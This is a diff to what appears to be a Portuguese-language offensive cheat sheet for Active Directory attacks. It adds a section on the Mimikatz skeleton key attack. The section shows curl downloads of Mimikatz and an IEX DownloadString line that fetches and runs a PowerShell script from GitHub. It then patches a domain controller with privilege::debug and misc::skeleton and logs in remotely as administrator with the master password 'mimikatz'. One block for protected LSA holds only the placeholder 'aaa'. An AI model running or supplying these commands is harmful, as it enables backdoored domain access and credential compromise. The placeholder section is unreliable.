@@ -1434,6 +1434,40 @@ RODAR COMANDO VIA WMI:
 ```
 Invoke-WmiMethod win32_process -ComputerName tech-dc01.tech.local -name create -argumentlist "cmd.exe /c whoami > c:\fudeu.txt"
 ```
+## SKELETON KEY MIMIKATZ
+##### SKELETON KEY MIMIKATZ - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+##### SKELETON KEY MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN):
+```
+privilege::debug
+misc::skeleton
+```
+ACESSAR REMOTAMENTE: (Senha: mimikatz)
+```
+enter-pssession -computername tech-dc01 -credential tech\administrator
+```
+##### SKELETON KEY MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN) SE O LSA.EXE ESTIVER PROTEGIDO:
+```
+aaa
+```
 
 
 
